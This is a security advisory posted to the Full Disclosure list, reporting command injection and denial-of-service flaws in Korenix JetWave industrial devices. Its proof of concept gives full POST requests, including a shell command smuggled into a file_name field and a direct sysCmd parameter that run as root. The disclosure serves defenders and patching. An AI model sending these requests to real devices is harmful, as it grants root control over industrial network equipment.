---
title: CyberDanube Security Research 20230213-0 | Multiple Vulnerabilities in JetWave Series
url: https://seclists.org/fulldisclosure/2023/Feb/9
source: Full Disclosure
date: 2023-02-15
fetch_date: 2025-10-04T06:41:55.261658
---

# CyberDanube Security Research 20230213-0 | Multiple Vulnerabilities in JetWave Series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20230213-0 | Multiple Vulnerabilities in JetWave Series

---

*From*: Thomas Weber <t.weber () cyberdanube com>
*Date*: Mon, 13 Feb 2023 15:15:36 +0100

---

```
CyberDanube Security Research 20230213-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
```

              product| JetWave4221 HP-E, JetWave 2212G, JetWave
2212X/2212S,
                     | JetWave 2211C, JetWave 2411/2111, JetWave
2411L/2111L,

```
                     | JetWave 2414/2114, JetWave 2424, JetWave 2460,
                     | JetWave 3220/3420 V3
   vulnerable version| See "Vulnerable Versions"
        fixed version| See "Solution"
           CVE number| requested
               impact| High
             homepage| https://korenix.com/
                found| 2022-11-28
                   by| S. Dietz, T. Weber (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
```

"Korenix Technology, a Beijer group company within the Industrial
Communication
business area, is a global leading manufacturer providing innovative,
market-

```
oriented, value-focused Industrial Wired and Wireless Networking Solutions.
[...]
Our products are mainly applied in SMART industries: Surveillance, Machine-
to-Machine, Automation, Remote Monitoring, andTransportation. Worldwide
```

customer base covers different Sales channels, including end-customers,
OEMs,

```
system integrators, and brand label partners."

Source:
https://www.korenix.com/en/about/index.aspx?kind=3

Vulnerable Versions:
-------------------------------------------------------------------------------
The following firmware versions have been found to be vulnerable by
CyberDanube:
 * Korenix JetWave4221 HP-E <= V1.3.0
 * Korenix JetWave 3220/3420 V3 < V1.7

The following firmware versions have been identified to be vulnerable by the
vendor:
 * Korenix JetWave 2212G V1.3.T
 * Korenix JetWave 2212X/2112S V1.3.0
 * Korenix JetWave 2211C < V1.6
 * Korenix JetWave 2411/2111 < V1.5
 * Korenix JetWave 2411L/2111L < V1.6
 * Korenix JetWave 2414/2114 < V1.4
 * Korenix JetWave 2424 < V1.3
 * Korenix JetWave 2460 < V1.6

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection
The web server of the device is prone to an authenticated command injection.
```

It allows an attacker to gain full access to the underlying operating
system of
the device with all implications. If such a device is acting as key
device in
an industrial network, or controls various critical equipment via serial
ports,
more extensive damage in the corresponding network can be done by an
attacker.

```
2) Authenticated Denial of Web-Service
```

When logged in, a user can issue a POST request such that the underlying
binary

```
exits. The Web-Service becomes unavailable and cannot be accessed until the
device gets rebooted.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection
1.a)
```

The command "touch /tmp/poc" was injected to the system by using the
following

```
POST request:
===============================================================================
POST /goform/formTFTPLoadSave HTTP/1.1
Host: 172.16.0.38
```

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:107.0)
Gecko/20100101 Firefox/107.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8

```
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Origin: http://172.16.0.38
Connection: close
Referer: http://172.16.0.38/mgmtsaveconf.asp
```

Cookie:
-common-web-session-=::webs.session::d7af70f81033cff3828902e476ceda45

```
Upgrade-Insecure-Requests: 1

submit-url=%2Fmgmtsaveconf.asp&ip_address=192.168.1.1&file_name=%24%28touch+%2Ftmp%2Fpoc%29&tftp_action=load&tftp_config=Submit
```

===============================================================================

```

```

The command gets executed as root and a file under the folder /tmp/ is
created.

```
1.b)
```

The command "touch /tmp/poc2" was injected to the system by using the
following

```
POST request:
===============================================================================
POST /goform/formSysCmd HTTP/1.1
Host: 172.16.0.38
Content-Type: application/x-www-form-urlencoded
Connection: close
Referer: 172.16.0.38
```

Cookie:
-common-web-session-=::webs.session::df1307d508d798638a8b4572987462bb

```
Content-Length: 40

sysCmd=touch%20/tmp/poc2&submit-url=
===============================================================================
```

The command gets executed as root and a file under the folder /tmp/ is
created.

```
Command output is written into /tmp/syscmd.

2) Authenticated Denial of Web-Service
The process goahead chrashes when the following POST request is sent to the
endpoint /goform/formDefault:
===============================================================================
POST /goform/formDefault HTTP/1.1
Host: 172.16.0.38
```

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:107.0)
Gecko/20100101 Firefox/107.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8

```
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: http://172.16.0.38
Connection: close
Referer: http://172.16.0.38/toolping.asp
```

Cookie:
-common-web-session-=::webs.session::3c624961199904f380e978a3967cc356

```
Upgrade-Insecure-Requests: 1

PingIPAddress=127.0.0.1&submit-url=%2Ftoolping.asp&Submit=Ping
```

===============================================================================

```
The output was observed on the terminal using our emulated instance:
```

===============================================================================

```
rm: invalid option -- /
BusyBox v1.01 (2022.10.21-00:22+0000) multi-call binary
Usage: rm [OPTION]... FILE...

Remove (unlink) the FILE(s).  You may use '--' to
indicate that all following arguments are non-options.

Options:
    -i        always prompt before removing each destination
    -f        remove existing destinations, never prompt
    -r or -R    remove the contents of directories recursively

killall: wlwatchdog: no process killed
killall: wlapwatchdog: no process killed
```

===============================================================================

```

```

The vulnerabilities were manually verified on an emulated device by
using the

```
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Solution
-------------------------------------------------------------------------------
Owner of these products are suggested to update to the following versions:
 * Korenix JetWave 4221 HP-E V1.4.0
 * Korenix...